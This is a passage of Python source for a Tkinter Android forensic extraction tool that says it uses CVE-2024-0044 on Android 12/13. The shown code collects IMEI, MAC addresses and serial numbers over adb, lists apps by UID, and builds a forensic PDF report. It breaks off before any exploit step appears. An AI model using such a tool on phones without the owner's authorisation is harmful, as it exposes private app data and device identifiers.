
#!/usr/bin/env python3
"""
Traverso Forensics - Android Data Extraction Tool
Enhanced version with PDF reporting and improved UI
Uses CVE-2024-0044 for Android 12/13 data extraction
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import subprocess
import threading
import os
import time
import hashlib
import shutil
from pathlib import Path
from datetime import datetime
import re

# ReportLab imports restored
try:
    from reportlab.lib.pagesizes import letter
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, Image as RLImage
    from reportlab.lib import colors
    from reportlab.lib.enums import TA_CENTER, TA_LEFT
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False


class AndroidExtractorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Traverso Forensics - Android Data Extractor")
        self.root.geometry("1200x750")
        self.root.configure(bg="#1e1e1e")
        self.root.resizable(True, True)
        
        self.device_connected = tk.BooleanVar(value=False)
        self.selected_package = tk.StringVar()
        self.selected_uid = tk.StringVar()
        self.selected_user_id = tk.StringVar(value="0")
        self.device_info = {}
        self.apps_list = []
        self.log_file = None
        self.log_entries = []
        self.extraction_start_time = None
        self.extraction_data = {}
        self.extraction_dir = None
        self.setup_styles()
        self.create_header()
        self.create_main_panels()
        self.create_footer()
    
    def create_log_file(self, extraction_dir):
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        self.log_file = os.path.join(extraction_dir, f"extraction_log_{timestamp}.txt")
        with open(self.log_file, 'w', encoding='utf-8') as f:
            f.write("=" * 80 + "\n")
            f.write("TRAVERSO FORENSICS - Android App Extraction Log\n")
            f.write("=" * 80 + "\n")
            f.write(f"Session started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"Log file: {self.log_file}\n")
            f.write("=" * 80 + "\n\n")
    
    def write_log(self, message, level="INFO"):
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        self.log_entries.append({"timestamp": timestamp, "level": level, "message": message})
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry + "\n")
            except Exception as e:
                print(f"Error writing to log: {e}")
    
    def update_progress(self, step, total, message):
        percentage = (step / total) * 100
        self.root.after(0, lambda: self.progress.configure(value=percentage))
        self.root.after(0, lambda: self.progress_label.config(text=message))
    
    def get_device_info(self):
        info = {}
        commands = {
            'dev_name': 'getprop ro.product.model',
            'model': 'getprop ro.product.model',
            'product': 'getprop ro.product.name',
            'software': 'getprop ro.build.version.release',
            'build_nr': 'getprop ro.build.display.id',
            'hardware': 'getprop ro.hardware',
            'serialnr': 'getprop ro.serialno',
            'IMEI': 'getprop ro.gsm.imei',
            'capacity': 'df /data | tail -1',
            'language': 'getprop persist.sys.locale',
        }
        
        for key, cmd in commands.items():
            stdout, _, code = self.run_adb_command(cmd, shell=True)
            if code == 0:
                if key == 'capacity':
                    parts = stdout.split()
                    if len(parts) >= 2:
                        total_kb = int(parts[1]) if parts[1].isdigit() else 0
                        info['capacity'] = f"{total_kb / 1024 / 1024:.2f} GB"
                        used_kb = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 0
                        free_kb = total_kb - used_kb
                        info['free_space'] = f"{free_kb / 1024 / 1024:.2f} GB"
                else:
                    info[key] = stdout.strip()
        
        info['imei'] = self.get_imei()
        
        stdout, _, code = self.run_adb_command("cat /sys/class/net/wlan0/address", shell=True)
        if code == 0:
            info['wifi_mac'] = stdout.strip()
        
        stdout, _, code = self.run_adb_command("settings get secure bluetooth_address", shell=True)
        if code == 0:
            info['bt_mac'] = stdout.strip()
        
        return info
    
    def get_imei(self):
        if self.log_file:
            self.write_log("Intentando método 1: gsm.baseband.imei", "INFO")
        stdout, _, code = self.run_adb_command("getprop gsm.baseband.imei", shell=True)
        if code == 0:
            imei = self._clean_imei(stdout)
            if self._is_valid_imei(imei):
                return imei
        
        whoami, _, _ = self.run_adb_command("whoami", shell=True)
        if whoami and "phablet" in whoami.lower():
            imei = self._get_imei_ubuntu_touch()
            if self._is_valid_imei(imei):
                return imei
        
        stdout, _, code = self.run_adb_command("getprop ro.gsm.imei", shell=True)
        if code == 0:
            imei = self._clean_imei(stdout)
            if self._is_valid_imei(imei):
                return imei
        
        stdout, _, code = self.run_adb_command("getprop ril.imei", shell=True)
        if code == 0:
            imei = self._clean_imei(stdout)
            if self._is_valid_imei(imei):
                return imei
        
        imei = self._get_imei_from_dumpsys()
        if self._is_valid_imei(imei):
            return imei
        
        android_version = self._get_android_version()
        if android_version >= 5:
            imei = self._get_imei_from_service_call()
            if self._is_valid_imei(imei):
                return imei
        
        return 'N/A'
    
    def _clean_imei(self, imei_value):
        if not imei_value:
            return ""
        return imei_value.replace("'", "").replace('"', '').strip()
    
    def _is_valid_imei(self, imei):
        if not imei or imei == "-" or imei == "":
            return False
        invalid_patterns = ["not found", "service", "000000", "null", "unknown", "n/a"]
        if any(pattern in imei.lower() for pattern in invalid_patterns):
            return False
        if not imei.isdigit():
            return False
        if len(imei) not in [14, 15]:
            return False
        return True
    
    def _get_imei_from_dumpsys(self):
        try:
            stdout, stderr, code = self.run_adb_command("dumpsys iphonesubinfo", shell=True)
            if code != 0 or not stdout:
                return ""
            match = re.search(r"Device ID\s*=\s*(\d+)", stdout)
            if match:
                return match.group(1)
        except Exception as e:
            if self.log_file:
                self.write_log(f"Error en dumpsys iphonesubinfo: {e}", "WARNING")
        return ""
    
    def _get_imei_from_service_call(self):
        try:
            stdout, stderr, code = self.run_adb_command(
                "service call iphonesubinfo 1 s16 com.android.shell | cut -c 50-66 | tr -d '.[:space:]'",
                shell=True
            )
            if code == 0 and stdout:
                imei = self._clean_imei(stdout)
                if imei:
                    return imei
            
            stdout, stderr, code = self.run_adb_command(
                "service call iphonesubinfo 1 s16 com.android.shell",
                shell=True
            )
            if code != 0 or not stdout:
                return ""
            imei_chars = []
            for line in stdout.split('\n'):
                matches = re.findall(r"'(.)'", line)
                imei_chars.extend(matches)
            imei = ''.join(imei_chars).strip()
            return imei if imei else ""
        except Exception as e:
            if self.log_file:
                self.write_log(f"Error en service call: {e}", "WARNING")
        return ""
    
    def _get_android_version(self):
        try:
            stdout, _, code = self.run_adb_command(
                "getprop ro.build.version.release", 
                shell=True
            )
            if code == 0 and stdout:
                version_str = stdout.strip().split(".")[0]
                return int(version_str)
        except Exception as e:
            pass
        return 0
    
    def _get_imei_ubuntu_touch(self):
        try:
            stdout, stderr, code = self.run_adb_command(
                'dbus-send --system --print-reply --dest=org.ofono /ril_0 org.ofono.Modem.GetProperties',
                shell=True
            )
            if code != 0 or not stdout:
                return ""
            match = re.search(r'"(\d{14,17})"', stdout)
            if match:
                return match.group(1)
        except Exception as e:
            pass
        return ""
    
    def should_show_app(self, app):
        package = app["package"]
        filter_type = self.app_filter.get()
        system_prefixes = ["com.android", "com.google", "android", "com.samsung"]
        is_system = any(package.startswith(prefix) for prefix in system_prefixes)
        
        if filter_type == "all":
            return True
        elif filter_type == "third_party":
            return not is_system
        elif filter_type == "native":
            return is_system
        return False
    
    def perform_search(self):
        try:
            self.filter_apps()
        except Exception as e:
            if self.log_file:
                self.write_log(f"Error in search: {e}", "ERROR")
    
    def clear_search_now(self):
        self.search_var.set("")
        try:
            self.filter_apps()
        except Exception as e:
            if self.log_file:
                self.write_log(f"Error clearing search: {e}", "ERROR")
    
    def filter_apps(self):
        try:
            if not hasattr(self, 'apps_listbox') or not hasattr(self, 'apps_list'):
                return
            if not self.apps_list:
                return
            
            search_term = ""
            if hasattr(self, 'search_var'):
                search_term = self.search_var.get().strip().lower()
            
            self.apps_listbox.delete(0, tk.END)
            
            for app in self.apps_list:
                package = app["package"]
                uid = app["uid"]
                
                if not self.should_show_app(app):
                    continue
                if search_term and search_term not in package.lower():
                    continue
                
                display = f"package:{package} uid:{uid}"
                self.apps_listbox.insert(tk.END, display)
            
            self.apps_listbox.update()
            self.root.update_idletasks()
        except Exception as e:
            if self.log_file:
                self.write_log(f"Error in filter_apps: {e}", "ERROR")
    
    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        self.bg_dark = "#1e1e1e"
        self.bg_panel = "#2d2d2d"
        self.bg_input = "#3d3d3d"
        self.fg_text = "#ffffff"
        self.fg_secondary = "#b0b0b0"
        self.accent_green = "#4a9d5f"
        self.accent_blue = "#2196F3"
        self.accent_orange = "#ff8c00"
        
        style.configure("blue.Horizontal.TProgressbar",
                       troughcolor=self.bg_input,
                       bordercolor=self.bg_panel,
                       background=self.accent_blue,
                       lightcolor=self.accent_blue,
                       darkcolor=self.accent_blue)
    
    def create_header(self):
        header_frame = tk.Frame(self.root, bg=self.bg_dark, height=120)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        left_frame = tk.Frame(header_frame, bg=self.bg_dark)
        left_frame.pack(side=tk.LEFT, padx=20, pady=10)
        
        try:
            from PIL import Image, ImageTk
            if os.path.exists("traverso_logo.png"):
                img = Image.open("traverso_logo.png")
                aspect_ratio = img.width / img.height
                new_height = 100
                new_width = int(new_height * aspect_ratio)
                img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                logo_label = tk.Label(left_frame, image=photo, bg=self.bg_dark)
                logo_label.image = photo
                logo_label.pack()
            else:
                tk.Label(left_frame, text="Traverso FORENSICS Logo Not Found", 
                        font=("Segoe UI", 12, "bold"),
                        foreground=self.accent_orange,
                        background=self.bg_dark).pack()
        except Exception as e:
            tk.Label(left_frame, text="Traverso FORENSICS", 
                    font=("Segoe UI", 12, "bold"),
                    foreground=self.fg_text,
                    background=self.bg_dark).pack()
        
        right_frame = tk.Frame(header_frame, bg=self.bg_dark)
        right_frame.pack(side=tk.RIGHT, padx=20, pady=10)
        
        info_labels = ["For Android 12 and 13", "No Downgrade", "No Root"]
        for i, text in enumerate(info_labels):
            tk.Label(right_frame, text=text, font=("Segoe UI", 9),
                    foreground=self.fg_secondary, background=self.bg_dark).grid(row=0, column=i*2, padx=10)
            if i < len(info_labels) - 1:
                tk.Label(right_frame, text="|", foreground=self.fg_secondary,
                        background=self.bg_dark).grid(row=0, column=i*2+1, padx=5)
        
        tk.Label(right_frame, text="Android App Extraction 1.0", font=("Segoe UI", 11, "bold"),
                foreground=self.accent_green, background=self.bg_dark).grid(row=1, column=0, columnspan=26, pady=(26,0))
    
    def create_main_panels(self):
        main_container = tk.Frame(self.root, bg=self.bg_dark)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        left_panel = self.create_left_panel(main_container)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        right_panel = self.create_right_panel(main_container)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
    
    def create_left_panel(self, parent):
        panel = tk.Frame(parent, bg=self.bg_panel, relief=tk.FLAT, borderwidth=1)
        
        tk.Label(panel, text="Package Information", font=("Segoe UI", 11, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
        
        uid_frame = tk.Frame(panel, bg=self.bg_panel)
        uid_frame.pack(fill=tk.X, padx=15, pady=5)
        tk.Label(uid_frame, text="UIDs:", font=("Segoe UI", 10),
                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
        self.uids_label = tk.Label(uid_frame, text="", font=("Segoe UI", 10),
                                   foreground=self.accent_orange, background=self.bg_panel)
        self.uids_label.pack(side=tk.LEFT, padx=10)
        
        pkg_frame = tk.Frame(panel, bg=self.bg_panel)
        pkg_frame.pack(fill=tk.X, padx=15, pady=5)
        tk.Label(pkg_frame, text="Package:", font=("Segoe UI", 10),
                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
        self.package_label = tk.Label(pkg_frame, text="", font=("Segoe UI", 10),
                                      foreground=self.accent_orange, background=self.bg_panel)
        self.package_label.pack(side=tk.LEFT, padx=10)
        
        buttons_frame = tk.Frame(panel, bg=self.bg_panel)
        buttons_frame.pack(fill=tk.X, padx=15, pady=15)
        
        # BOTÓN VERDE AL INICIO
        self.detect_btn = tk.Button(buttons_frame, text="Detect Device", bg=self.accent_green, fg=self.fg_text,
                                    font=("Segoe UI", 9, "bold"), relief=tk.FLAT, padx=15, pady=10,
                                    cursor="hand2", command=self.check_device)
        self.detect_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        self.listapps_btn = tk.Button(buttons_frame, text="List Apps", bg=self.bg_input, fg=self.fg_text,
                                      font=("Segoe UI", 9), relief=tk.FLAT, padx=15, pady=10,
                                      cursor="hand2", command=self.list_all_apps, state=tk.DISABLED)
        self.listapps_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
        
        tk.Label(panel, text="List of devices attached", font=("Segoe UI", 10),
                foreground=self.fg_secondary, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(5,0))
        
        self.device_text = tk.Text(panel, bg=self.bg_input, fg=self.fg_text, font=("Consolas", 9),
                                   height=4, relief=tk.FLAT, borderwidth=0)
        self.device_text.pack(fill=tk.X, padx=15, pady=5)
        
        tk.Label(panel, text="List Apps", font=("Segoe UI", 11, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 5))
        
        radio_frame = tk.Frame(panel, bg=self.bg_panel)
        radio_frame.pack(fill=tk.X, padx=15, pady=5)
        
        self.app_filter = tk.StringVar(value="third_party")
        
        tk.Radiobutton(radio_frame, text="Third Party Applications", variable=self.app_filter, value="third_party",
                      bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
                      activebackground=self.bg_panel, activeforeground=self.fg_text,
                      font=("Segoe UI", 9), command=self.filter_apps).pack(anchor=tk.W, pady=2)
        
        tk.Radiobutton(radio_frame, text="Native Applications", variable=self.app_filter, value="native",
                      bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
                      activebackground=self.bg_panel, activeforeground=self.fg_text,
                      font=("Segoe UI", 9), command=self.filter_apps).pack(anchor=tk.W, pady=2)
        
        tk.Radiobutton(radio_frame, text="All Applications", variable=self.app_filter, value="all",
                      bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
                      activebackground=self.bg_panel, activeforeground=self.fg_text,
                      font=("Segoe UI", 9), command=self.filter_apps).pack(anchor=tk.W, pady=2)
        
        search_frame = tk.Frame(panel, bg=self.bg_panel)
        search_frame.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        tk.Label(search_frame, text="Search:", font=("Segoe UI", 9),
                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT, padx=(0, 5))
        
        self.search_var = tk.StringVar()
        self.search_var.trace("w", lambda *args: self.perform_search())
        
        self.search_entry = tk.Entry(search_frame, textvariable=self.search_var, bg=self.bg_input,
                                     fg=self.fg_text, font=("Segoe UI", 9), relief=tk.FLAT,
                                     insertbackground=self.fg_text)
        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=5)
        
        tk.Button(search_frame, text="✕", bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 10),
                 relief=tk.FLAT, padx=8, pady=2, cursor="hand2",
                 command=self.clear_search_now).pack(side=tk.LEFT, padx=(5, 0))
        
        list_frame = tk.Frame(panel, bg=self.bg_panel)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        scrollbar = tk.Scrollbar(list_frame, bg=self.bg_input)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.apps_listbox = tk.Listbox(list_frame, bg=self.bg_input, fg=self.fg_text, font=("Consolas", 9),
                                       relief=tk.FLAT, borderwidth=0, selectbackground=self.accent_blue,
                                       selectforeground="white", yscrollcommand=scrollbar.set)
        self.apps_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.apps_listbox.yview)
        self.apps_listbox.bind('<<ListboxSelect>>', self.on_app_select)
        
        return panel
    
    def create_right_panel(self, parent):
        panel = tk.Frame(parent, bg=self.bg_panel, relief=tk.FLAT, borderwidth=1)
        
        tk.Label(panel, text="Exploiting Vulnerability", font=("Segoe UI", 11, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
        
        top_frame = tk.Frame(panel, bg=self.bg_panel)
        top_frame.pack(fill=tk.X, padx=15, pady=10)
        
        try:
            from PIL import Image, ImageTk
            if os.path.exists("android_logo.png"):
                img = Image.open("android_logo.png")
                img = img.resize((100, 100), Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                logo_label = tk.Label(top_frame, image=photo, bg=self.bg_panel)
                logo_label.image = photo
                logo_label.pack(side=tk.RIGHT, padx=20)
            else:
                tk.Label(top_frame, text="🤖", font=("Segoe UI", 70),
                        bg=self.bg_panel, fg=self.accent_green).pack(side=tk.RIGHT, padx=20)
        except:
            tk.Label(top_frame, text="🤖", font=("Segoe UI", 70),
                    bg=self.bg_panel, fg=self.accent_green).pack(side=tk.RIGHT, padx=20)
        
        tables_container = tk.Frame(panel, bg=self.bg_panel)
        tables_container.pack(fill=tk.X, padx=15, pady=15)
        
        users_frame = tk.Frame(tables_container, bg=self.bg_input)
        users_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        tk.Label(users_frame, text="Users", font=("Segoe UI", 9, "bold"),
                background=self.bg_input, foreground=self.fg_text).pack(pady=5)
        self.users_listbox = tk.Listbox(users_frame, bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 9),
                                        relief=tk.FLAT, borderwidth=0, selectbackground=self.accent_blue,
                                        selectforeground="white", height=3)
        self.users_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=(0, 5))
        self.users_listbox.bind('<<ListboxSelect>>', self.on_user_select)
        
        uids_frame = tk.Frame(tables_container, bg=self.bg_input)
        uids_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        tk.Label(uids_frame, text="UIDs", font=("Segoe UI", 9, "bold"),
                background=self.bg_input, foreground=self.fg_text).pack(pady=5)
        self.uids_listbox = tk.Listbox(uids_frame, bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 9),
                                       relief=tk.FLAT, borderwidth=0, selectbackground=self.accent_blue,
                                       selectforeground="white", height=3)
        self.uids_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=(0, 5))
        self.uids_listbox.bind('<<ListboxSelect>>', self.on_uid_select)
        
        self.progress = ttk.Progressbar(panel, mode='determinate', length=300, style="blue.Horizontal.TProgressbar")
        self.progress.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        self.progress_label = tk.Label(panel, text="", bg=self.bg_panel, fg=self.fg_text, font=("Segoe UI", 9))
        self.progress_label.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        self.start_btn = tk.Button(panel, text="Start Extraction", bg=self.bg_input, fg=self.fg_text,
                                   font=("Segoe UI", 10, "bold"), relief=tk.FLAT, padx=20, pady=12,
                                   cursor="hand2", command=self.start_extraction, state=tk.DISABLED)
        self.start_btn.pack(fill=tk.X, padx=15, pady=10)
        
        tk.Label(panel, text="Extracted Files", font=("Segoe UI", 10, "bold"),
                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 5))
        
        table_frame = tk.Frame(panel, bg=self.bg_input)
        table_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        headers_frame = tk.Frame(table_frame, bg=self.bg_input)
        headers_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(headers_frame, text="Name", font=("Segoe UI", 9, "bold"), bg=self.bg_input,
                fg=self.fg_secondary, width=40, anchor=tk.W).pack(side=tk.LEFT, padx=2)
        tk.Label(headers_frame, text="Modified Date", font=("Segoe UI", 9, "bold"), bg=self.bg_input,
                fg=self.fg_secondary, width=20, anchor=tk.W).pack(side=tk.LEFT, padx=2)
        tk.Label(headers_frame, text="Type", font=("Segoe UI", 9, "bold"), bg=self.bg_input,
                fg=self.fg_secondary, width=15, anchor=tk.W).pack(side=tk.LEFT, padx=2)
        
        self.files_text = scrolledtext.ScrolledText(table_frame, bg=self.bg_input, fg=self.fg_text,
                                                    font=("Consolas", 9), relief=tk.FLAT,
                                                    borderwidth=0, height=8)
        self.files_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=(0, 5))
        self.files_text.insert(1.0, "This folder is empty.")
        self.files_text.config(state=tk.DISABLED)
        
        return panel
    
    def create_footer(self):
        footer = tk.Frame(self.root, bg=self.bg_dark, height=30)
        footer.pack(fill=tk.X, side=tk.BOTTOM)
        footer.pack_propagate(False)
        tk.Label(footer, text="Developer: Miguel Ángel Alfredo TRAVERSO - 2026",
                font=("Segoe UI", 8), foreground=self.fg_secondary,
                background=self.bg_dark).pack(side=tk.LEFT, padx=10)
    
    def run_adb_command(self, command, shell=False, timeout=30):
        try:
            if shell:
                full_command = ["adb", "shell"] + command.split()
            else:
                full_command = ["adb"] + command.split()
            
            if self.log_file:
                self.write_log(f"Executing command: {' '.join(full_command)}")
            
            result = subprocess.run(full_command, capture_output=True, text=True, timeout=timeout)
            
            if self.log_file:
                if result.returncode == 0:
                    self.write_log(f"Command successful: {command}")
                else:
                    self.write_log(f"Command failed: {command} - Error: {result.stderr}", "ERROR")
            
            return result.stdout, result.stderr, result.returncode
        except Exception as e:
            if self.log_file:
                self.write_log(f"Exception executing command: {command} - {str(e)}", "ERROR")
            return None, str(e), 1
    
    def check_device(self):
        self.device_text.delete(1.0, tk.END)
        
        def check():
            stdout, stderr, code = self.run_adb_command("devices")
            
            if code != 0:
                self.device_text.insert(1.0, "ADB is not installed or not in PATH")
                self.device_connected.set(False)
                return
            
            lines = stdout.strip().split('\n')
            if len(lines) < 2 or "device" not in lines[1]:
                self.device_text.insert(1.0, "No device connected")
                self.device_connected.set(False)
                return
            
            self.device_connected.set(True)
            device_line = lines[1]
            self.device_text.insert(tk.END, device_line)
            self.extraction_data = self.get_device_info()
            
            # CAMBIO A GRIS AL DETECTAR
            self.root.after(0, lambda: self.detect_btn.config(bg=self.bg_input, state=tk.DISABLED))
            self.root.after(0, lambda: self.listapps_btn.config(state=tk.NORMAL, bg=self.accent_green))
        
        threading.Thread(target=check, daemon=True).start()
    
    def list_all_apps(self):
        if not self.device_connected.get():
            messagebox.showwarning("Device Not Connected", "Please connect a device first")
            return
        
        def list_apps():
            stdout, stderr, code = self.run_adb_command("pm list packages -U", shell=True)
            if code != 0:
                return
            
            self.apps_list = []
            for line in stdout.strip().split('\n'):
                if line and "package:" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        package = parts[0].replace("package:", "")
                        uid = parts[1].replace("uid:", "") if "uid:" in parts[1] else "N/A"
                        self.apps_list.append({"package": package, "uid": uid})
            
            self.root.after(0, self.filter_apps)
        
        threading.Thread(target=list_apps, daemon=True).start()
    
    def on_app_select(self, event):
        selection = self.apps_listbox.curselection()
        if not selection:
            return
        
        line = self.apps_listbox.get(selection[0])
        parts = line.split()
        package = parts[0].replace("package:", "")
        uid = parts[1].replace("uid:", "")
        
        self.selected_package.set(package)
        self.selected_uid.set(uid)
        self.package_label.config(text=package)
        self.uids_label.config(text=uid)
        
        self.users_listbox.delete(0, tk.END)
        self.users_listbox.insert(tk.END, "0")
        self.uids_listbox.delete(0, tk.END)
        self.uids_listbox.insert(tk.END, uid)
        self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
    
    def on_user_select(self, event):
        selection = self.users_listbox.curselection()
        if selection:
            self.uids_listbox.selection_clear(0, tk.END)
            self.uids_listbox.selection_set(selection[0])
    
    def on_uid_select(self, event):
        selection = self.uids_listbox.curselection()
        if selection:
            self.users_listbox.selection_clear(0, tk.END)
            self.users_listbox.selection_set(selection[0])
    
    def calculate_hash256(self, filepath):
        sha256_hash = hashlib.sha256()
        with open(filepath, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    
    # METODO RESTAURADO PARA GENERAR REPORTE PDF
    def generate_pdf_report(self, extraction_dir, package_name, uid):
        if not REPORTLAB_AVAILABLE:
            self.write_log("ReportLab not available, skipping PDF generation", "WARNING")
            return None
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            pdf_filename = f"Report_{package_name}_{timestamp}.pdf"
            pdf_path = os.path.join(extraction_dir, pdf_filename)
            
            self.write_log(f"Generating PDF report: {pdf_filename}")
            
            doc = SimpleDocTemplate(pdf_path, pagesize=letter, rightMargin=72, leftMargin=72,
                                  topMargin=72, bottomMargin=18)
            
            Story = []
            styles = getSampleStyleSheet()
            
            heading_style = ParagraphStyle('CustomHeading', parent=styles['Heading2'], fontSize=14,
                                          textColor=colors.HexColor('#2196F3'), spaceAfter=12, spaceBefore=12)
            
            if os.path.exists("traverso_logo.png"):
                try:
                    logo = RLImage("traverso_logo.png", width=3*inch, height=0.8*inch)
                    Story.append(logo)
                    Story.append(Spacer(1, 15))
                except Exception as e:
                    self.write_log(f"Could not load logo: {e}", "WARNING")
                    Story.append(Paragraph("TRAVERSO FORENSICS", 
                                         ParagraphStyle('FallbackTitle', parent=styles['Heading1'], 
                                                       fontSize=24, alignment=TA_CENTER)))
                    Story.append(Spacer(1, 15))
            else:
                Story.append(Paragraph("TRAVERSO FORENSICS", 
                                     ParagraphStyle('FallbackTitle', parent=styles['Heading1'], 
                                                   fontSize=24, alignment=TA_CENTER)))
                Story.append(Spacer(1, 15))
            
            Story.append(Paragraph("FORENSIC REPORT - PHONE CONTENT", heading_style))
            Story.append(Spacer(1, 12))
            
            case_data = [
                ['Case Details', ''],
                ['Case Number:', '1'],
                ['Case Evidence Number:', '1'],
                ['Evidence Order Details:', package_name.upper()]
            ]
            
            case_table = Table(case_data, colWidths=[3*inch, 4*inch])
            case_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2d2d2d')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            
            Story.append(case_table)
            Story.append(Spacer(1, 20))
            
            device_info = self.extraction_data
            device_data = [
                ['Device Information', ''],
                ['Dev-Name:', device_info.get('dev_name', 'Unknown')],
                ['Model-Nr:', device_info.get('model', 'Unknown')],
                ['UDID:', device_info.get('serialnr', 'N/A')],
                ['Hardware:', device_info.get('hardware', 'N/A')],
                ['WiFi MAC:', device_info.get('wifi_mac', 'N/A')],
                ['Product:', device_info.get('product', 'N/A')],
                ['BT MAC:', device_info.get('bt_mac', 'N/A')],
                ['Software:', device_info.get('software', 'N/A')],
                ['Capacity:', device_info.get('capacity', 'N/A')],
                ['Build Nr:', device_info.get('build_nr', 'N/A')],
                ['Free Space:', device_info.get('free_space', 'N/A')],
                ['Language:', device_info.get('language', 'N/A')],
                ['ECID:', 'N/A'],
                ['Serialnr:', device_info.get('serialnr', 'N/A')],
                ['IMEI:', device_info.get('imei', 'Not Available')],
                ['MLB-snr:', 'N/A'],
            ]
            
            device_table = Table(device_data, colWidths=[2.5*inch, 4.5*inch])
            device_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2d2d2d')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, -1), 9),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            
            Story.append(device_table)
            Story.append(Spacer(1, 20))
            
            extraction_data = [
                ['Extraction Details', ''],
                ['Extraction Started:', self.extraction_start_time or 'N/A'],
                ['Extraction Finished:', datetime.now().strftime('%d/%m/%Y %H:%M:%S (UTC-3)')],
                ['Extracted By:', 'Traverso Forensics Android App Extraction 1.0'],
                ['Report Generated By:', 'Traverso Forensics Android App Extraction 1.0']
            ]
            
            ext_table = Table(extraction_data, colWidths=[3*inch, 4*inch])
            ext_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2d2d2d')),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('FONTSIZE', (0, 0), (-1, 0), 12),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            
            Story.append(ext_table)
            Story.append(PageBreak())
            
            Story.append(Paragraph("Extraction Log", heading_style))
            Story.append(Spacer(1, 12))
            
            log_style = ParagraphStyle('LogStyle', parent=styles['Code'], fontSize=7, leading=9)
            
            for entry in self.log_entries:
                log_line = f"[{entry['timestamp']}] [{entry['level']}] {entry['message']}"
                Story.append(Paragraph(log_line, log_style))
            
            Story.append(PageBreak())
            
            Story.append(Paragraph("Installed Applications on Device", heading_style))
